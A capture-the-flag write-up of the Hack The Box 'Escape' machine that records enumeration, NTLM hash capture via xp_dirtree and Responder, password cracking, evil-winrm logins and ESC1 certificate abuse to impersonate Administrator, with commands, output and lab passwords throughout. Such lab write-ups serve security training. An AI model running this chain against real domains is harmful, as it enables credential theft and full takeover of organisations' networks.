---
{"dg-publish":true,"permalink":"/ct-fs/htb/escape/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #MSSQL #Responder #ADCS #clock_skew #ESC1

Can you escape?


## Recon
![Pasted image 20260827135015.png](/img/user/Pasted%20image%2020260827135015.png)

### Nmap:
```zsh
nmap -p53,135,139,88,389,464,445,593,636,1433,3269,3268,5985,9389,49666,49689,49690,49711,55258 -sV -sC -T4 -Pn -oA 10.129.228.253 10.129.228.253
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 16:51 -0400
Nmap scan report for 10.129.228.253
Host is up (0.093s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-28 04:51:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-08-28T04:53:14+00:00; +8h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-28T04:53:13+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-08-28T04:53:14+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-28T04:48:36
|_Not valid after:  2056-08-28T04:48:36
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-28T04:53:14+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2026-08-28T04:53:13+00:00; +8h00m01s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
55258/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
| smb2-time: 
|   date: 2026-08-28T04:52:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.84 second
```
Initial portscan shows ports open on a windows DC for standard windows domain services as well as MSRPC, LDAP, and MSSQL. 

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/escape/scanning]
└─$ nxc smb $IP                                                                 
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)

```
raw `nxc` scan confirms it's running Windows 10 / Server 2019 build 17763. Adding domain and name to our /etc/hosts file.


### Port 445 (SMB)
#### Netexec
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/escape/scanning]
└─$ nxc smb DC.sequel.htb -u '' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.253  445    DC               [+] sequel.htb\: 
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/escape/scanning]
└─$ nxc smb DC.sequel.htb -u 'Guest' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.253  445    DC               [+] sequel.htb\Guest: 
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share 
```
Enumerating for null and Guest share access we see that the Guest user has read access to an uncommon share called `Public`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/escape/scanning]
└─$ nxc smb DC.sequel.htb -u 'Guest' -p '' --rid-brute
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.253  445    DC               [+] sequel.htb\Guest: 
SMB         10.129.228.253  445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.228.253  445    DC               500: sequel\Administrator (SidTypeUser)
SMB         10.129.228.253  445    DC               501: sequel\Guest (SidTypeUser)
SMB         10.129.228.253  445    DC               502: sequel\krbtgt (SidTypeUser)
SMB         10.129.228.253  445    DC               512: sequel\Domain Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               513: sequel\Domain Users (SidTypeGroup)
SMB         10.129.228.253  445    DC               514: sequel\Domain Guests (SidTypeGroup)
SMB         10.129.228.253  445    DC               515: sequel\Domain Computers (SidTypeGroup)
SMB         10.129.228.253  445    DC               516: sequel\Domain Controllers (SidTypeGroup)
SMB         10.129.228.253  445    DC               517: sequel\Cert Publishers (SidTypeAlias)
SMB         10.129.228.253  445    DC               518: sequel\Schema Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               519: sequel\Enterprise Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.228.253  445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.228.253  445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.228.253  445    DC               525: sequel\Protected Users (SidTypeGroup)
SMB         10.129.228.253  445    DC               526: sequel\Key Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.228.253  445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.228.253  445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.228.253  445    DC               1000: sequel\DC$ (SidTypeUser)
SMB         10.129.228.253  445    DC               1101: sequel\DnsAdmins (SidTypeAlias)
SMB         10.129.228.253  445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.228.253  445    DC               1103: sequel\Tom.Henn (SidTypeUser)
SMB         10.129.228.253  445    DC               1104: sequel\Brandon.Brown (SidTypeUser)
SMB         10.129.228.253  445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)
SMB         10.129.228.253  445    DC               1106: sequel\sql_svc (SidTypeUser)
SMB         10.129.228.253  445    DC               1107: sequel\James.Roberts (SidTypeUser)
SMB         10.129.228.253  445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)
```
We also successfully brute a valid user list with the Guest access while we're at it.

```zsh
└─$ smbclient -U "Guest" \\\\DC.sequel.htb\\Public
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

		5184255 blocks of size 4096. 1467570 blocks available
smb: \> get "SQL Server Procedures.pdf" 
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (107.5 KiloBytes/sec) (average 107.5 KiloBytes/sec)
```
Logging into the share we see one document called `SQL Server Procedures.pdf` and we successfully exfiltrate it to our attacker machine.

![Pasted image 20260827141312.png](/img/user/Pasted%20image%2020260827141312.png)
In the document we find instructions for accessing the exposed sql server and an email for user `Brandon` at `brandon.brown@sequel.htb` which is confirmed from our previous rid brute.

![Pasted image 20260827141429.png](/img/user/Pasted%20image%2020260827141429.png)
At the bottom of the document we also see creds for any that are "waiting for their users to be created". We may be able to pull sensitive data with these creds from the database.

```zsh
SQL (PublicUser  guest@tempdb)> EXEC master..xp_dirtree '\\10.10.15.154\share';
subdirectory   depth   
------------   -----   

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:dbe469d6918c2dc1:18E9476CDFD0E2A978880E9692F90522:010100000000000000C042814D36DD01ECC9655665C131CE000000000200080054004F005900360001001E00570049004E002D00320051004E004C00420031004200580055003200590004003400570049004E002D00320051004E004C0042003100420058005500320059002E0054004F00590036002E004C004F00430041004C000300140054004F00590036002E004C004F00430041004C000500140054004F00590036002E004C004F00430041004C000700080000C042814D36DD01060004000200000008003000300000000000000000000000003000006FDE3721F7314F3973B93A0089A72C12596DDD067217B3CAEDC97A0C1B604B520A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100350034000000000000000000
```
After enumerating the tables we don't find anything of value so I looked at a hint and it said to get the server to read an arbitrary smb share on our end and capture the hash for it with `responder`. We successfully get the Net-NTLMv2 hash for user `sql_svc`.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/escape/files]
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt sql_svc 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:02 DONE (2026-08-27 18:10) 0.3816g/s 4084Kp/s 4084Kc/s 4084KC/s RENZOJAVIER..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
We successfully crack the hash for `sql_svc`
## Initial Access
### evil-winrm with stolen creds
```zsh
└─$ evil-winrm -u sql_svc -p 'REGGIE1234ronnie' -i 10.129.228.253
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> dir
```
We successfully login to the DC as user `sql_svc`.

```zsh
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```
Enumerating the Users folder we see users `Ryan.Cooper` and the `Administrator` user on the server.

```zsh
*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK
2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
	Sep 24 2019 13:48:23
	Copyright (C) 2019 Microsoft Corporation
	Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)

2022-11-18 13:43:05.97 Server      UTC adjustment: -8:00
2022-11-18 13:43:05.97 Server      (c) Microsoft Corporation.
2022-11-18 13:43:05.97 Server      All rights reserved.
2022-11-18 13:43:05.97 Server      Server process ID is 3788.
2022-11-18 13:43:05.97 Server      System Manufacturer: 'VMware, Inc.', System Model: 'VMware7,1'.
2022-11-18 13:43:05.97 Server      Authentication mode is MIXED.
2022-11-18 13:43:05.97 Server      Logging SQL Server messages in file 'C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG'.
2022-11-18 13:43:05.97 Server      The service account is 'NT Service\MSSQL$SQLMOCK'. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      Registry startup parameters:
	 -d C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
	 -e C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\Log\ERRORLOG
	 -l C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
2022-11-18 13:43:05.97 Server      Command Line Startup Parameters:
	 -s "SQLMOCK"
	 -m "SqlSetup"
	 -Q
	 -q "SQL_Latin1_General_CP1_CI_AS"
	 -T 4022
	 -T 4010
	 -T 3659
	 -T 3610
	 -T 8015
2022-11-18 13:43:05.97 Server      SQL Server detected 1 sockets with 1 cores per socket and 1 logical processors per socket, 1 total logical processors; using 1 logical processors based on SQL Server licensing. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      SQL Server is starting at normal priority base (=7). This is an informational message only. No user action is required.
2022-11-18 13:43:05.97 Server      Detected 2046 MB of RAM. This is an informational message; no user action is required.
2022-11-18 13:43:05.97 Server      Using conventional memory in the memory manager.
2022-11-18 13:43:05.97 Server      Page exclusion bitmap is enabled.
2022-11-18 13:43:05.98 Server      Buffer Pool: Allocating 262144 bytes for 166158 hashPages.
2022-11-18 13:43:06.01 Server      Default collation: SQL_Latin1_General_CP1_CI_AS (us_english 1033)
2022-11-18 13:43:06.04 Server      Buffer pool extension is already disabled. No action is necessary.
2022-11-18 13:43:06.06 Server      Perfmon counters for resource governor pools and groups failed to initialize and are disabled.
2022-11-18 13:43:06.07 Server      Query Store settings initialized with enabled = 1,
2022-11-18 13:43:06.07 Server      This instance of SQL Server last reported using a process ID of 5116 at 11/18/2022 1:43:04 PM (local) 11/18/2022 9:43:04 PM (UTC). This is an informational message only; no user action is required.
2022-11-18 13:43:06.07 Server      Node configuration: node 0: CPU mask: 0x0000000000000001:0 Active CPU mask: 0x0000000000000001:0. This message provides a description of the NUMA configuration for this computer. This is an informational message only. No user action is required.
2022-11-18 13:43:06.07 Server      Using dynamic lock allocation.  Initial allocation of 2500 Lock blocks and 5000 Lock Owner blocks per node.  This is an informational message only.  No user action is required.
2022-11-18 13:43:06.08 Server      In-Memory OLTP initialized on lowend machine.
2022-11-18 13:43:06.08 Server      The maximum number of dedicated administrator connections for this instance is '1'
2022-11-18 13:43:06.09 Server      [INFO] Created Extended Events session 'hkenginexesession'

2022-11-18 13:43:06.09 Server      Database Instant File Initialization: disabled. For security and performance considerations see the topic 'Database Instant File Initialization' in SQL Server Books Online. This is an informational message only. No user action is required.
2022-11-18 13:43:06.10 Server      CLR version v4.0.30319 loaded.
2022-11-18 13:43:06.10 Server      Total Log Writer threads: 1. This is an informational message; no user action is required.
2022-11-18 13:43:06.13 Server      Database Mirroring Transport is disabled in the endpoint configuration.
2022-11-18 13:43:06.13 Server      clflushopt is selected for pmem flush operation.
2022-11-18 13:43:06.14 Server      Software Usage Metrics is disabled.
2022-11-18 13:43:06.14 spid9s      Warning ******************
2022-11-18 13:43:06.36 spid9s      SQL Server started in single-user mode. This an informational message only. No user action is required.
2022-11-18 13:43:06.36 Server      Common language runtime (CLR) functionality initialized using CLR version v4.0.30319 from C:\Windows\Microsoft.NET\Framework64\v4.0.30319\.
2022-11-18 13:43:06.37 spid9s      Starting up database 'master'.
2022-11-18 13:43:06.38 spid9s      The tail of the log for database master is being rewritten to match the new sector size of 4096 bytes.  2048 bytes at offset 419840 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf will be written.
2022-11-18 13:43:06.39 spid9s      Converting database 'master' from version 897 to the current version 904.
2022-11-18 13:43:06.39 spid9s      Database 'master' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.40 spid9s      Database 'master' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.41 spid9s      Database 'master' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.52 spid9s      Database 'master' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:06.52 spid9s      Database 'master' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:06.72 spid9s      SQL Server Audit is starting the audits. This is an informational message. No user action is required.
2022-11-18 13:43:06.72 spid9s      SQL Server Audit has started the audits. This is an informational message. No user action is required.
2022-11-18 13:43:06.74 spid9s      SQL Trace ID 1 was started by login "sa".
2022-11-18 13:43:06.74 spid9s      Server name is 'DC\SQLMOCK'. This is an informational message only. No user action is required.
2022-11-18 13:43:06.75 spid14s     Starting up database 'mssqlsystemresource'.
2022-11-18 13:43:06.75 spid9s      Starting up database 'msdb'.
2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
2022-11-18 13:43:06.76 spid14s     The resource database build version is 15.00.2000. This is an informational message only. No user action is required.
2022-11-18 13:43:06.78 spid9s      The tail of the log for database msdb is being rewritten to match the new sector size of 4096 bytes.  3072 bytes at offset 50176 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf will be written.
2022-11-18 13:43:06.78 spid9s      Converting database 'msdb' from version 897 to the current version 904.
2022-11-18 13:43:06.78 spid9s      Database 'msdb' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.79 spid14s     Starting up database 'model'.
2022-11-18 13:43:06.79 spid9s      Database 'msdb' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.80 spid14s     The tail of the log for database model is being rewritten to match the new sector size of 4096 bytes.  512 bytes at offset 73216 in file C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\modellog.ldf will be written.
2022-11-18 13:43:06.80 spid9s      Database 'msdb' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.81 spid14s     Converting database 'model' from version 897 to the current version 904.
2022-11-18 13:43:06.81 spid14s     Database 'model' running the upgrade step from version 897 to version 898.
2022-11-18 13:43:06.81 spid9s      Database 'msdb' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.81 spid14s     Database 'model' running the upgrade step from version 898 to version 899.
2022-11-18 13:43:06.81 spid9s      Database 'msdb' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.82 spid14s     Database 'model' running the upgrade step from version 899 to version 900.
2022-11-18 13:43:06.88 spid18s     A self-generated certificate was successfully loaded for encryption.
2022-11-18 13:43:06.88 spid18s     Server local connection provider is ready to accept connection on [ \\.\pipe\SQLLocal\SQLMOCK ].
2022-11-18 13:43:06.88 spid18s     Dedicated administrator connection support was not started because it is disabled on this edition of SQL Server. If you want to use a dedicated administrator connection, restart SQL Server using the trace flag 7806. This is an informational message only. No user action is required.
2022-11-18 13:43:06.88 spid18s     SQL Server is now ready for client connections. This is an informational message; no user action is required.
2022-11-18 13:43:06.88 Server      SQL Server is attempting to register a Service Principal Name (SPN) for the SQL Server service. Kerberos authentication will not be possible until a SPN is registered for the SQL Server service. This is an informational message. No user action is required.
2022-11-18 13:43:06.88 spid14s     Database 'model' running the upgrade step from version 900 to version 901.
2022-11-18 13:43:06.89 Server      The SQL Server Network Interface library could not register the Service Principal Name (SPN) [ MSSQLSvc/dc.sequel.htb:SQLMOCK ] for the SQL Server service. Windows return code: 0x2098, state: 15. Failure to register a SPN might cause integrated authentication to use NTLM instead of Kerberos. This is an informational message. Further action is only required if Kerberos authentication is required by authentication policies and if the SPN has not been manually registered.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 901 to version 902.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:06.89 spid14s     Database 'model' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:07.00 spid14s     Clearing tempdb database.
2022-11-18 13:43:07.06 spid14s     Starting up database 'tempdb'.
2022-11-18 13:43:07.17 spid9s      Database 'msdb' running the upgrade step from version 902 to version 903.
2022-11-18 13:43:07.17 spid9s      Database 'msdb' running the upgrade step from version 903 to version 904.
2022-11-18 13:43:07.29 spid9s      Recovery is complete. This is an informational message only. No user action is required.
2022-11-18 13:43:07.30 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.30 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.33 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'default language' changed from 0 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'default full-text language' changed from 1033 to 1033. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.34 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'user instances enabled' changed from 1 to 1. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.44 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
2022-11-18 13:43:07.76 spid51      Using 'xpstar.dll' version '2019.150.2000' to execute extended stored procedure 'xp_sqlagent_is_starting'. This is an informational message only; no user action is required.
2022-11-18 13:43:08.24 spid51      Changed database context to 'master'.
2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
2022-11-18 13:43:09.29 spid9s      SQL Server is terminating in response to a 'stop' request from Service Control Manager. This is an informational message only. No user action is required.
2022-11-18 13:43:09.31 spid9s      .NET Framework runtime has been stopped.
2022-11-18 13:43:09.43 spid9s      SQL Trace was stopped due to server shutdown. Trace ID = '1'. This is an informational message only; no user action is required.
```
Another hint later and we see there one error log file in the SQLServer directory on the root of the server. In it we see user `Ryan.Cooper` attempting to authenticate to the server and accidentally send their password via plaintext.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/escape/files]
└─$ evil-winrm -u Ryan.Cooper -p 'NuclearMosquito3' -i 10.129.228.253
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```
Successfully authenticate as `Ryan.Cooper` on the server.
## Privilege Escalation
### ADCS
```json
  "Certificate Templates": {
    "0": {
      "Template Name": "UserAuthentication",
      "Display Name": "UserAuthentication",
      "Certificate Authorities": [
        "sequel-DC-CA"
      ],
      "Enabled": true,
      "Client Authentication": true,
      "Enrollment Agent": false,
      "Any Purpose": false,
      "Enrollee Supplies Subject": true,
      "Certificate Name Flag": [
        1
      ],
      "Enrollment Flag": [
        1,
        8
      ],
      "Private Key Flag": [
        16
      ],
      "Extended Key Usage": [
        "Client Authentication",
        "Secure Email",
        "Encrypting File System"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 2,
      "Validity Period": "10 years",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2022-11-18 21:10:22+00:00",
      "Template Last Modified": "2024-01-19 00:26:38+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "SEQUEL.HTB\\Domain Admins",
            "SEQUEL.HTB\\Domain Users",
            "SEQUEL.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "SEQUEL.HTB\\Administrator",
          "Full Control Principals": [
            "SEQUEL.HTB\\Domain Admins",
            "SEQUEL.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "SEQUEL.HTB\\Domain Admins",
            "SEQUEL.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "SEQUEL.HTB\\Domain Admins",
            "SEQUEL.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "SEQUEL.HTB\\Domain Admins",
            "SEQUEL.HTB\\Domain Users",
            "SEQUEL.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "SEQUEL.HTB\\Domain Users"
      ],
      "[!] Vulnerabilities": {
        "ESC1": "Enrollee supplies subject and template allows client authentication."
      }
    }
```
As we enumerate for any Active Directory Certificate Services abuses we see one for the `ESC1` vulnerability. This vulnerability allows the enrollee (us) to supply the `subject` which is the name of any account in that environment and authenticate to the Certificate Authority  as that user effectively giving us access. See more [here](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)

>[!info]
>![Pasted image 20260828151212.png](/img/user/Pasted%20image%2020260828151212.png)
>It is because of this combination of misconfigurations that will allow us to impersonate `Administrator` on this DC.

```zsh
┌──(kali㉿kali)-[~/…/HTB/escape/files/bloodhound]
└─$ certipy-ad req -u ryan.cooper@DC.sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -target DC.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn 'Administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```
And just like that we make the request to the CA and get the private key for the `Administrator` user on the DC.

```zsh
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[-] Failed to extract NT hash: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
[-] Use -debug to print a stacktrace
```
We then use certipy to authenticate with the `administrator.pfx` against the DC to steal the kerberos and NTLM hash credentials of `Administrator`. However, the system is telling us our clockskew is too far off that of the DC to obtain the creds. So we use a program called `faketime` to spoof that we are within five minutes of the DC time.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB]
└─$ ntpdate -q 10.129.98.207
2026-08-29 02:50:25.629733 (-0400) +28800.239634 +/- 0.045339 10.129.98.207 s1 no-leap

                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/…/HTB/escape/files/bloodhound]
└─$ date                                     
Fri Aug 28 06:54:25 PM EDT 2026
```
